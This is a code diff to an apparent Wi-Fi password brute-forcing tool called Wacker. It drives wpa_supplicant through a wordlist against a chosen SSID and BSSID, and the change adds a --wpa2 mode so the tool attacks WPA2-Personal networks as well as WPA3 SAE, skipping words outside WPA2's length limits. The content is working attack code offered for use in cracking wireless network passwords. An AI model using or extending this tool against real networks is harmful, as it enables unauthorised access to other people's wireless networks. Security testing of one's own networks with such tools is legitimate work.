@@ -39,6 +39,7 @@ class Wacker(object):
         self.wpa  = './wpa_supplicant-2.8/wpa_supplicant/wpa_supplicant'
         self.pid  = f'{self.server}.pid'
         self.me = f'{self.dir}/{args.interface}_client'
+        self.key_mgmt = ('SAE', 'WPA-PSK')[args.brute_wpa2]
         self.cmd = f'{self.wpa} -P {self.pid} -B -i {self.args.interface} -c {self.conf}'
         if args.debug:
             self.cmd += f' -d -t -K -f {self.log}'
@@ -111,7 +112,7 @@ class Wacker(object):
         ''' One time setup needed for supplicant '''
         self.send_to_server('ATTACH')
         self.send_to_server(f'SET_NETWORK 0 ssid "{self.args.ssid}"')
-        self.send_to_server(f'SET_NETWORK 0 key_mgmt SAE')
+        self.send_to_server(f'SET_NETWORK 0 key_mgmt {self.key_mgmt}')
         self.send_to_server(f'SET_NETWORK 0 bssid {self.args.bssid}')
         self.send_to_server(f'SET_NETWORK 0 scan_freq {self.args.freq}')
         self.send_to_server(f'SET_NETWORK 0 freq_list {self.args.freq}')
@@ -122,7 +123,10 @@ class Wacker(object):
     def send_connection_attempt(self, psk):
         ''' Send a connection request to supplicant'''
         logging.info(f'Trying key: {psk}')
-        self.send_to_server(f'SET_NETWORK 0 sae_password "{psk}"')
+        if self.key_mgmt == 'SAE':
+            self.send_to_server(f'SET_NETWORK 0 sae_password "{psk}"')
+        else:
+            self.send_to_server(f'SET_NETWORK 0 psk "{psk}"')
         self.send_to_server(f'ENABLE_NETWORK 0')
 
     def listen(self, count):
@@ -204,6 +208,7 @@ parser.add_argument('--ssid', type=str, dest='ssid', required=True, help='the ss
 parser.add_argument('--freq', type=int, dest='freq', required=True, help='frequency of the ap')
 parser.add_argument('--start', type=str, dest='start_word', help='word to start with in the wordlist')
 parser.add_argument('--debug', action='store_true', help='increase logging output')
+parser.add_argument('--wpa2', dest='brute_wpa2', action='store_true', help='brute force wpa2-personal')
 
 args = parser.parse_args()
 
@@ -241,10 +246,14 @@ def attempt(word, count):
 count = 1
 for word in args.wordlist:
     word = word.rstrip('\n')
-    result = attempt(word, count)
-    if result == Wacker.SUCCESS:
-        print(f"\nFound the password: '{word}'")
-        break
+    # SAE allows all lengths otherwise WPA2 has restrictions
+    if not args.brute_wpa2 or 8 <= len(word.encode('utf-8')) <= 63:
+        result = attempt(word, count)
+        if result == Wacker.SUCCESS:
+            print(f"\nFound the password: '{word}'")
+            break
+    else:
+        print(f'Bad word in wordlist: "{word}"')
     count += 1
 else:
     print('\nFlag not found')
